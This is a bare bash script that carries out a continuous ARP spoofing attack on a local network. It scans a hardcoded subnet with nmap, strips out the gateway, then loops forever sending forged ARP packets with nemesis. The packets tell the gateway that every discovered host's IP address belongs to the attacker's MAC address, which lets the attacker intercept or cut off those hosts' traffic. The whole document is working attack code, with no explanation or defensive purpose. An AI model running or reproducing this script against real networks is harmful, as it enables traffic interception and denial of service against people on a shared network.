#!/bin/bash
varmac="c8:be:19:8f:1f:3a"	#mac address gateway
gateway="167.13.0.1"		#ip address gateway
hgateway="dlinkdrouter"		#hostname gateway

while true
do
echo "start... find hosts"
nmap -sn 167.13.0.0/24 |grep for > .tmp
awk -F ' ' '{print $5}' .tmp > .hosts
rm .tmp
echo "ping hosts..."
for ipaddr in `cat .hosts`
	do
	ping -c 1 $ipaddr|grep ping | awk -F ' ' '{print $2}'
	done
hmac_addr=`ifconfig |grep  eth0 | awk -F ' ' '{print $6}'`
cat .hosts |grep -w -v  $gateway > .tmp
cat .tmp > .hosts
cat .hosts |grep -w -v $hgateway >.tmp
cat .tmp > .hosts
rm .tmp
echo "inject ip address:"
for addr in `cat .hosts`
	do
	echo $addr
	sudo nemesis arp -r -d eth0 -S $addr -D $gateway -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac 
	done
echo done
echo sleep 6
rm .hosts
sleep 6
done

